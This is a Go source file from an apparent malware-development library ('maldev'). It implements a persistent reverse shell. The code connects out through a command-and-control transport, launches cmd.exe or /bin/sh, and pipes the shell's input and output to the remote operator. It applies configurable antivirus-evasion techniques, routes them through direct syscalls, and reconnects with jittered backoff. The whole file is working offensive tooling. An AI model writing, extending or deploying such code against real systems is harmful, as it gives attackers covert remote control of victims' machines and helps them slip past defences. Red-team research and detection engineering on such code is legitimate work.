package shell

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"github.com/creack/pty"

	"github.com/oioio-space/maldev/c2/transport"
	"github.com/oioio-space/maldev/evasion"
)

// Config contains shell configuration.
type Config struct {
	// ShellPath overrides the default shell binary.
	// Defaults to "cmd.exe" on Windows, "/bin/sh" on others.
	ShellPath string

	// ShellArgs are additional arguments passed to the shell binary.
	ShellArgs []string

	// MaxRetries is the maximum number of reconnection attempts (0 = unlimited).
	MaxRetries int

	// ReconnectWait is the delay between reconnection attempts.
	ReconnectWait time.Duration

	// Evasion holds evasion techniques to apply on startup. Ignored on non-Windows platforms.
	Evasion []evasion.Technique

	// Caller is an optional *wsyscall.Caller for routing evasion techniques
	// through direct/indirect syscalls. Pass nil for standard WinAPI.
	// Ignored on non-Windows platforms.
	Caller evasion.Caller

	// MaxBackoff is the ceiling for exponential backoff between reconnection
	// attempts. Default: 5 minutes.
	MaxBackoff time.Duration

	// JitterFactor controls the random jitter applied to reconnect delays.
	// 0.25 means +/-25% (default). Set to 0 to disable jitter.
	JitterFactor float64
}

// DefaultConfig returns a sensible default configuration.
func DefaultConfig() *Config {
	shellPath := "/bin/sh"
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shellPath = "cmd.exe"
	}
	return &Config{
		ShellPath:     shellPath,
		ShellArgs:     shellArgs,
		MaxRetries:    0,
		ReconnectWait: 5 * time.Second,
		MaxBackoff:    5 * time.Minute,
		JitterFactor:  0.25,
	}
}

// Shell represents a reverse shell instance with automatic reconnection.
// Lifecycle is managed by an internal state machine with phases:
// Idle → Connecting → Connected → Running → Reconnecting → Stopped.
type Shell struct {
	config    *Config
	transport transport.Transport
	sm        *stateMachine
}

// New creates a new Shell with the given transport and config.
// If cfg is nil, DefaultConfig() is used.
func New(trans transport.Transport, cfg *Config) *Shell {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	return &Shell{
		config:    cfg,
		transport: trans,
		sm:        newStateMachine(),
	}
}

// CurrentPhase returns the current lifecycle phase (thread-safe).
func (s *Shell) CurrentPhase() Phase {
	return s.sm.Phase()
}

// Start runs the reverse shell with automatic reconnection.
func (s *Shell) Start(ctx context.Context) error {
	s.sm.mu.Lock()
	if err := s.sm.current.start(s.sm, ctx); err != nil {
		s.sm.mu.Unlock()
		return err
	}
	s.sm.mu.Unlock()

	defer func() {
		s.sm.mu.Lock()
		s.sm.transition(&stoppedState{})
		s.sm.mu.Unlock()
		s.sm.markDone()
	}()

	// Apply evasion techniques if configured.
	if len(s.config.Evasion) > 0 {
		if err := applyEvasion(s.config.Evasion, s.config.Caller); err != nil {
			fmt.Fprintf(os.Stderr, "[!] Evasion: %v\n", err)
		}
	}

	return s.reconnectLoop(ctx)
}

// reconnectLoop handles the reconnection loop with exponential backoff.
func (s *Shell) reconnectLoop(ctx context.Context) error {
	retries := 0
	baseWait := s.config.ReconnectWait
	currentWait := baseWait
	maxWait := s.config.MaxBackoff
	if maxWait <= 0 {
		maxWait = 5 * time.Minute
	}
	jitter := s.config.JitterFactor
	if jitter < 0 {
		jitter = 0
	}

	// First connection attempt is immediate.
	if err := s.attemptSession(ctx); err != nil {
		retries++
		fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)

		if s.shouldStop(retries) {
			return fmt.Errorf("max retries (%d) exceeded", s.config.MaxRetries)
		}
	} else {
		retries = 0
		currentWait = baseWait
	}

	for {
		s.sm.mu.Lock()
		s.sm.transition(&reconnectingState{})
		s.sm.mu.Unlock()

		// Exponential backoff with configurable jitter
		var waitTime time.Duration
		if jitter > 0 && currentWait > 0 {
			jitterRange := time.Duration(float64(currentWait) * jitter)
			jitterOffset := time.Duration(rand.Int63n(int64(jitterRange)))
			waitTime = currentWait + jitterOffset - jitterRange/2
		} else {
			waitTime = currentWait
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-s.sm.stopCh:
			return nil
		case <-time.After(waitTime):
			if s.shouldStop(retries) {
				return fmt.Errorf("max retries (%d) exceeded", s.config.MaxRetries)
			}

			if err := s.attemptSession(ctx); err != nil {
				retries++
				fmt.Fprintf(os.Stderr, "[!] Attempt %d failed: %v\n", retries, err)
				currentWait = currentWait * 2
				if currentWait > maxWait {
					currentWait = maxWait
				}
				continue
			}

			retries = 0
			currentWait = baseWait
		}
	}
}

// attemptSession tries a complete session (connect + shell).
func (s *Shell) attemptSession(ctx context.Context) error {
	s.sm.mu.Lock()
	s.sm.transition(&connectingState{})
	s.sm.mu.Unlock()

	if err := s.transport.Connect(ctx); err != nil {
		return err
	}
	defer s.transport.Close()

	s.sm.mu.Lock()
	s.sm.transition(&connectedState{})
	s.sm.mu.Unlock()

	return s.runSession(ctx)
}

// runSession executes a shell session (PTY on Unix, direct I/O on Windows).
func (s *Shell) runSession(ctx context.Context) error {
	s.sm.mu.Lock()
	s.sm.transition(&runningState{})
	s.sm.mu.Unlock()

	args := s.config.ShellArgs
	cmd := exec.CommandContext(ctx, s.config.ShellPath, args...)

	if runtime.GOOS == "windows" {
		return s.runDirect(cmd)
	}
	return s.runWithPTY(cmd)
}

// runDirect binds shell I/O directly to the transport (Windows).
func (s *Shell) runDirect(cmd *exec.Cmd) error {
	cmd.Stdin = s.transport
	cmd.Stdout = s.transport
	cmd.Stderr = s.transport

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start: %w", err)
	}

	return cmd.Wait()
}

// runWithPTY runs the shell inside a pseudo-terminal (Unix).
func (s *Shell) runWithPTY(cmd *exec.Cmd) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("failed to start pty: %w", err)
	}
	defer ptmx.Close()

	return s.copyBidirectional(ptmx, cmd)
}

// copyBidirectional copies data between the transport and the PTY.
func (s *Shell) copyBidirectional(ptmx *os.File, cmd *exec.Cmd) error {
	var wg sync.WaitGroup
	wg.Add(2)

	// Transport -> PTY
	go func() {
		defer wg.Done()
		io.Copy(ptmx, s.transport)
	}()

	// PTY -> Transport
	go func() {
		defer wg.Done()
		io.Copy(s.transport, ptmx)
	}()

	err := cmd.Wait()
	wg.Wait()

	return err
}

// Stop gracefully stops the reverse shell.
func (s *Shell) Stop() error {
	s.sm.mu.Lock()
	defer s.sm.mu.Unlock()
	return s.sm.current.stop(s.sm)
}

// Wait blocks until the shell terminates.
func (s *Shell) Wait() {
	<-s.sm.doneCh
}

// IsRunning returns true if the shell is in an active phase
// (connecting, connected, running, or reconnecting).
func (s *Shell) IsRunning() bool {
	p := s.sm.Phase()
	return p != PhaseIdle && p != PhaseStopped
}

// shouldStop checks if reconnection should stop.
func (s *Shell) shouldStop(retries int) bool {
	return s.config.MaxRetries > 0 && retries >= s.config.MaxRetries
}
